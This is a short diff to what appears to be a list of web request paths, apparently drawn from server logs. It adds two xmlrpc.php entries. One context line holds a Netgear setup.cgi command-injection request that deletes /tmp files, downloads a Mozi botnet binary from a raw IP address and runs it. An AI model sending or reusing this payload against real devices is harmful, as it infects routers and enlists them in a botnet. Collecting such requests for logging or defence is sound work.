@@ -11533,3 +11533,5 @@ http://www.ip138.com/
 /?srsltid=AfmBOop96EvAI3UGXT14urlOio-dhH21jelggKRq3bvU2tTy1ryGsCj8
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.117.43.112:49887/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /old/xmlrpc.php
+/blog/xmlrpc.php
+/new/xmlrpc.php
